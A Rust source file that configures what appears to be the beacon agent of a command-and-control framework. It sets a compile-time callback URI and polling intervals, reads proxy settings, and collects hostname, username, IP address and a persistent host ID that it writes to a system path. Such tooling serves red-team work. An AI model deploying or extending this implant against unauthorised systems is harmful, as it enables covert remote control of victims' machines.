use crate::version::VERSION;
use pb::c2::host::Platform;
use std::{
    fs::{self, File},
    io::Write,
    path::Path,
};
use uuid::Uuid;

macro_rules! callback_uri {
    () => {
        match option_env!("IMIX_CALLBACK_URI") {
            Some(uri) => uri,
            None => "http://127.0.0.1:80/grpc",
        }
    };
}
/*
 * Compile-time constant for the agent callback URI, derived from the IMIX_CALLBACK_URI environment variable during compilation.
 * Defaults to "http://127.0.0.1:80/grpc" if this is unset.
 */
pub const CALLBACK_URI: &str = callback_uri!();

macro_rules! callback_interval {
    () => {
        match option_env!("IMIX_CALLBACK_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent retry interval, derived from the IMIX_RETRY_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const CALLBACK_INTERVAL: &str = callback_interval!();

macro_rules! retry_interval {
    () => {
        match option_env!("IMIX_RETRY_INTERVAL") {
            Some(interval) => interval,
            None => "5",
        }
    };
}
/* Compile-time constant for the agent callback interval, derived from the IMIX_CALLBACK_INTERVAL environment variable during compilation.
 * Defaults to 5 if unset.
 */
pub const RETRY_INTERVAL: &str = retry_interval!();

/*
 * Config holds values necessary to configure an Agent.
 */
#[derive(Debug, Clone)]
pub struct Config {
    pub info: pb::c2::Beacon,
    pub callback_uri: String,
    pub proxy_uri: Option<String>,
    pub retry_interval: u64,
}

/*
 * A default configuration for the agent.
 */
impl Default for Config {
    fn default() -> Self {
        let agent = pb::c2::Agent {
            identifier: format!("imix-v{}", VERSION),
        };

        let host = pb::c2::Host {
            name: whoami::hostname(),
            identifier: get_host_id(get_host_id_path()),
            platform: get_host_platform() as i32,
            primary_ip: get_primary_ip(),
        };

        let info = pb::c2::Beacon {
            identifier: String::from(Uuid::new_v4()),
            principal: whoami::username(),
            interval: match CALLBACK_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!("failed to parse callback interval constant, defaulting to 5 seconds: {_err}");

                    5_u64
                }
            },
            host: Some(host),
            agent: Some(agent),
        };

        Config {
            info,
            callback_uri: String::from(CALLBACK_URI),
            proxy_uri: get_system_proxy(),
            retry_interval: match RETRY_INTERVAL.parse::<u64>() {
                Ok(i) => i,
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "failed to parse retry interval constant, defaulting to 5 seconds: {_err}"
                    );

                    5
                }
            },
        }
    }
}

fn get_system_proxy() -> Option<String> {
    #[cfg(target_os = "linux")]
    {
        match std::env::var("http_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find http_proxy env var: {}", _e);
            }
        }

        match std::env::var("https_proxy") {
            Ok(val) => return Some(val),
            Err(_e) => {
                #[cfg(debug_assertions)]
                log::debug!("Didn't find https_proxy env var: {}", _e);
            }
        }
        return None;
    }
    #[cfg(target_os = "windows")]
    {
        return None;
    }
    #[cfg(target_os = "macos")]
    {
        return None;
    }
    #[cfg(target_os = "freebsd")]
    {
        return None;
    }

    todo!()
}

/*
 * Returns which Platform imix has been compiled for.
 */
fn get_host_platform() -> Platform {
    #[cfg(target_os = "linux")]
    return Platform::Linux;

    #[cfg(target_os = "macos")]
    return Platform::Macos;

    #[cfg(target_os = "windows")]
    return Platform::Windows;

    #[cfg(any(target_os = "freebsd", target_os = "netbsd", target_os = "openbsd"))]
    return Platform::Bsd;

    #[cfg(all(
        not(target_os = "linux"),
        not(target_os = "macos"),
        not(target_os = "windows"),
        not(target_os = "freebsd"),
        not(target_os = "netbsd"),
        not(target_os = "openbsd"),
    ))]
    return Platform::Unspecified;
}

/*
 * Returns a predefined path to the host id file based on the current platform.
 */
fn get_host_id_path() -> String {
    #[cfg(target_os = "windows")]
    return String::from("C:\\ProgramData\\system-id");

    #[cfg(not(target_os = "windows"))]
    return String::from("/etc/system-id");
}

/*
 * Attempt to read a host-id from a predefined path on disk.
 * If the file exist, it's value will be returned as the identifier.
 * If the file does not exist, a new value will be generated and written to the file.
 * If there is any failure reading / writing the file, the generated id is still returned.
 */
fn get_host_id(file_path: String) -> String {
    // Read Existing Host ID
    let path = Path::new(file_path.as_str());
    if path.exists() {
        if let Ok(host_id) = fs::read_to_string(path) {
            return host_id.trim().to_string();
        }
    }

    // Generate New
    let host_id = Uuid::new_v4().to_string();

    // Save to file
    match File::create(path) {
        Ok(mut f) => match f.write_all(host_id.as_bytes()) {
            Ok(_) => {}
            Err(_err) => {
                #[cfg(debug_assertions)]
                log::error!("failed to write host id file: {_err}");
            }
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to create host id file: {_err}");
        }
    };

    host_id
}

/*
 * Return the first IPv4 address of the default interface as a string.
 * Returns the empty string otherwise.
 */
fn get_primary_ip() -> String {
    match default_net::get_default_interface() {
        Ok(default_interface) => match default_interface.ipv4.first() {
            Some(ip) => ip.addr.to_string(),
            None => String::from(""),
        },
        Err(_err) => {
            #[cfg(debug_assertions)]
            log::error!("failed to get primary ip: {_err}");

            String::from("")
        }
    }
}
